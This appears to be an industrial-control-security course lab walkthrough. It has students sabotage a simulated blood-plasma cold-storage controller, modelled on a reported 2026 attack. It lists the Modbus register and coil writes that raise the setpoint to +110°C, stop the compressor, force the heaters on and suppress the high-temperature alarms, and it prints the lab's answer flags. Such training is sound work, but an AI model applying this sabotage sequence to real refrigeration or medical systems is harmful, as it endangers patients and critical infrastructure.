# Lab 16: Healthcare Blood Plasma Cold-Chain Sabotage (EFS / Coolworld 2026)

## Lab Overview
| Attribute | Value |
| :--- | :--- |
| **Course** | `VULNOT-401` — AI-in-OT, Agentic ICS Exploitation & Emerging Threats |
| **Scenario** | Scenario 15 — Healthcare Cryo-Storage & Blood Plasma Cold-Chain (`10.0.12.10:5021`) |
| **Protocols** | Modbus TCP (`5021`), Danfoss AK-SM800A / Coolworld TeleMon REST API |
| **Difficulty** | Advanced (90 Minutes) |
| **MITRE ATT&CK for ICS** | `T0886` (Remote Services), `T0836` (Modify Parameter), `T0838` (Modify Alarm Settings), `T0828` (Loss of Productivity and Revenue) |
| **IEC 62443 Mapping** | `FR1` (Authentication), `FR3` (System Integrity), `FR5` (Restricted Data Flow — Third-Party Vendor Conduit) |

---

## Real-World Threat Context ("From Frozen Peas to Frozen Plasma in Three Weeks")
In late October and early November 2026, a wave of coordinated cyberattacks swept across 15+ European countries targeting internet-exposed industrial refrigeration controllers (such as Danfoss AK-SM800A units and third-party telemonitoring gateways). Initially, attackers disrupted supermarket food cold chains ("frozen peas") by forcing commercial freezers into high-heat defrost cycles.

During the night of **November 1–2, 2026**, the campaign escalated to critical healthcare infrastructure: attackers compromised a third-party refrigeration telemonitoring component operated by contractor **Coolworld**, which supplied cold-storage vaults to **Établissement Français du Sang (EFS)** — France's national blood service. The attackers reprogrammed freezers storing blood donor samples and Fresh Frozen Plasma (FFP) intended for patient transfusions from **`-30.0°C` to `+110.0°C` (`230°F`)**. Catastrophic loss was only averted because an on-call technician noticed the rising temperatures in time and intervened manually.

---

## Learning Objectives
1. **Enumerate the Third-Party Contractor Conduit (`obj-16-1`)**: Discover the exposed `Coolworld-TeleMon v3.2` cellular gateway and Danfoss AK-SM800A Modbus register map on `10.0.12.10:5021` protecting 4,800 blood & plasma units.
2. **Execute the `-30°C` to `+110°C` Freezer Sabotage (`obj-16-2`)**: Reprogram `HR0` (`target_setpoint_c`) from `-30.0°C` to `+110.0°C`, disable the cascade compressor (`COIL0 = False`), and force the 18 kW electric defrost heating rods ON (`COIL1 = True`, `HR2 = +110.0°C`).
3. **Suppress Controller High-Temperature Alarms (`obj-16-3`)**: Shift `HR3` (`high_temp_alarm_limit_c`) from `-25.0°C` to `+120.0°C` to blind local panel alarms while observing the out-of-band on-call watchdog trigger.

---

## Step-by-Step Walkthrough

### Step 1: Enumerate the EFS / Coolworld Cryo-Storage Controller
Run `vulnot-ai cryo-sabotage --status-only` to inspect the 3 blood bank vaults (`VAULT-A` Fresh Frozen Plasma, `VAULT-B` Donor Samples, `VAULT-C` Cryoprecipitate) and Modbus register layout:
```bash
vulnot-ai cryo-sabotage --status-only
```
Record the `recon_flag` (`VULNOT{coolworld_contractor_cryo_gateway_enumerated}`).

### Step 2: Reprogram Setpoint from `-30.0°C` to `+110.0°C` & Force Defrost Heaters
Execute the exact November 2026 Coolworld/EFS parameter modification:
```bash
vulnot-ai cryo-sabotage --setpoint 110.0 --force-defrost --suppress-alarm
```
Observe the state transition:
- `previous_setpoint_c`: `-30.0` → `new_setpoint_c`: `110.0`
- `cascade_compressor_on`: `false`
- `electric_defrost_heater_on`: `true`
- `high_temp_alarm_limit_c`: `120.0`
- `chamber_actual_temp_c`: `-23.4` (`oncall_tech_alert_triggered: true`)

### Step 3: Submit Flags to Moodle (`https://portal.mjolnir.training`)
```bash
vulnot-moodle submit lab-16 -f "VULNOT{coolworld_contractor_cryo_gateway_enumerated}"
vulnot-moodle submit lab-16 -f "VULNOT{efs_blood_freezer_minus30_to_110c_sabotage}"
```
